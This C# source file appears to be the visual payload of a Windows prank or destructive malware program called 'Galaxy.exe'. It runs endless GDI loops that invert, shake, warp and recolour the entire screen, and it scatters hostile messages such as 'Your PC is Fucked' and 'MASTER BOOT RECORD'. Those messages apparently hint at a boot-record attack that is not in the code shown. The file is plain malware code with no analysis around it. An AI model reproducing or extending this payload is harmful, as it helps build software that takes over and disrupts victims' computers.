using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Vanara.PInvoke;
using static Vanara.PInvoke.HWND;
using static Vanara.PInvoke.Kernel32;
using static Vanara.PInvoke.User32;
using static Vanara.PInvoke.Gdi32;
using static Vanara.PInvoke.Gdi32.RasterOperationMode;
using System.Drawing;

namespace Galaxy
{
    public class GDI
    {
        public static void Texts()
        {
            Random rand = new Random();
            while (true)
            {
                var dc = GetDC(NULL);
                var font = CreateFont(40, 0, rand.Next(100), 0, 700, false, true, false, 0, 0, 0, 0, 0, "Arial");
                var color = new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255));
                var color2 = new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255));
                SetTextColor(dc, color);
                SetBkColor(dc, color2);

                int w = rand.Next(GetSystemMetrics(0));
                int h = rand.Next(GetSystemMetrics((SystemMetric)1));
                string[] text = { "Galaxy.exe",
                    "Your PC is Fucked",
                    "Finally",
                    "PhisicalDrive0",
                    "MASTER BOOT RECORD",
                    "Final"};

                int index = rand.Next(text.Length);
                SelectObject(dc, font);
                TextOut(dc, w, h, text[index], text[index].Length);
                DeleteDC(dc);
                DeleteObject(font);
                Sleep((byte)rand.Next(100));
            }
        }
        public static void GDI1()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics((SystemMetric)1);
            Random rand = new Random();
            int i = 0;

            while (true)
            {
                i += 10;
                var dc = GetDC(NULL);
                var brush = CreateSolidBrush(new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255)));
                SelectObject(dc, brush);
                BitBlt(dc, 0, 0, w, h, dc, 0, 0, MERGECOPY);
                DeleteObject(brush);
                DeleteDC(dc);
                if (i >= rand.Next(100))
                {
                    RedrawWindow(HWND.NULL, null, HRGN.NULL,
    RedrawWindowFlags.RDW_INVALIDATE |
    RedrawWindowFlags.RDW_ERASE |
    RedrawWindowFlags.RDW_ALLCHILDREN);
                    i = 0;
                }
                Sleep((byte)rand.Next(100));
            }
        }
        public static void GDI2()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics((SystemMetric)1);
            var rand = new Random();
            while (true)
            {
                var dc = GetDC(NULL);
                var dcC = CreateCompatibleDC(dc);
                var hbitmap = CreateCompatibleBitmap(dc, w, h);
                var oldbitmap = SelectObject(dcC, hbitmap);
                BitBlt(dcC, 0, 0, w, h, dc, 0, 0, SRCCOPY);
                int offsetX = rand.Next(-3, 3);
                int offsetY = rand.Next(-3, 3);
                BitBlt(dc, offsetX, offsetY, w, h, dcC, 0, 0, SRCCOPY);

                DeleteDC(dc);
                DeleteDC(dcC);
                DeleteObject(hbitmap);
                DeleteObject(oldbitmap);

            }

        }
        public static void GDI3()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics((SystemMetric)1);
            var rand = new Random();
            while (true)
            {
                var dc = GetDC(NULL);
                var dcC = CreateCompatibleDC(dc);
                var hbitmap = CreateCompatibleBitmap(dc, w, h);
                var oldbitmap = SelectObject(dcC, hbitmap);
                BitBlt(dcC, 0, 0, w, h, dc, 0, 0, SRCCOPY);

                AlphaBlend(dc, rand.Next(2), rand.Next(2), w, h, dcC, 0, 0, w, h, new BLENDFUNCTION(50));

                DeleteDC(dc);
                DeleteDC(dcC);
                DeleteObject(hbitmap);
                DeleteObject(oldbitmap);

            }
        }

        public static void GDI4()
        {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics((SystemMetric)1);
            Random rand = new Random();
            int i = 0;
            Point[] point = new Point[3];
            while (true)
            {
                RECT rc = new RECT(0, 0, w, h);
                var dc = GetDC(HWND.NULL);
                var hdc = CreateCompatibleDC(dc);
                var hbit = CreateCompatibleBitmap(dc, w, h);
                var holdbit = SelectObject(hdc, hbit);
                if (i == 1)
                {
                    point[0].X = (rc.left + 30) + 0;
                    point[0].Y = (rc.top - 30) + 0;

                    point[1].X = (rc.right + 30) + 0;
                    point[1].Y = (rc.top + 30) + 0;

                    point[2].X = (rc.left - 30) + 0;
                    point[2].Y = (rc.bottom - 30) + 0;
                    i = 0;

                }
                else
                {
                    point[0].X = (rc.left - 30) + 0;
                    point[0].Y = (rc.top + 30) + 0;

                    point[1].X = (rc.right - 30) + 0;
                    point[1].Y = (rc.top - 30) + 0;

                    point[2].X = (rc.left + 30) + 0;
                    point[2].Y = (rc.bottom + 30) + 0;
                    i = 1;

                }

                var brush = CreateSolidBrush(new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255)));
                BitBlt(hdc, 0, 0, w, h, dc, 0, 0, SRCCOPY);

                PlgBlt(dc, point, dc, rc.left, rc.top, (rc.right - rc.left), (rc.bottom + rc.top), HBITMAP.NULL, 0, 0);
                SelectObject(dc, brush);
                PatBlt(dc, 0, 0, w, h, PATINVERT);
                AlphaBlend(dc, 0, 0, w, h, hdc, 0, 0, w, h, new BLENDFUNCTION(100));

                SelectObject(hdc, holdbit);
                DeleteObject(holdbit);
                DeleteObject(hbit);
                DeleteDC(dc);
                DeleteDC(hdc);
                DeleteObject(brush);
                Sleep((byte)rand.Next(100));
                var color = CreateSolidBrush(new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255)));
                int randd = rand.Next(w);
                SelectObject(dc, color);
                BitBlt(dc, randd, rand.Next(-4, 100), rand.Next(100), h, dc, randd, 0, MERGECOPY);

                var dcC = CreateCompatibleDC(dc);
                var oldbit = SelectObject(dcC, hbit);
                BitBlt(dcC, 0, 0, w, h, dc, 0, 0, SRCPAINT);
                int offsetX = rand.Next(-1, 1);
                int offsetY = rand.Next(-1, 1);
                BitBlt(dc, offsetX, offsetY, w, h, dcC, 0, 0, SRCPAINT);

                DeleteDC(dc);
                DeleteDC(dcC);
                DeleteObject(hbit);
                DeleteObject(oldbit);
            }
        }
        public static void GDI5()
        {
            Random rand = new Random();
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics((SystemMetric)1);
            while (true)
            {
                int x = rand.Next(GetSystemMetrics(0));
                int y = rand.Next(GetSystemMetrics((SystemMetric)1));
                var dc = GetDC(NULL);
                var dcC = CreateCompatibleDC(dc);
                var hbitmap = CreateCompatibleBitmap(dc, w, h);
                var oldbitmap = SelectObject(dcC, hbitmap);

                var color = new COLORREF((byte)rand.Next(255), (byte)rand.Next(255), (byte)rand.Next(255));
                SetPixel(dc, x, y, color);
                BitBlt(dcC, 0, 0, w, h, dc, 0, 0, SRCINVERT);
                int offsetX = rand.Next(-2,4);
                int offsetY = rand.Next(-2,4);
                BitBlt(dc, offsetY,offsetX, w, h, dcC, 0, 0, SRCINVERT);
                SelectObject(dcC, oldbitmap);
                DeleteDC(dc);
                DeleteDC(dcC);
                DeleteObject(hbitmap);
                DeleteObject(oldbitmap);
            }
        }
    }
}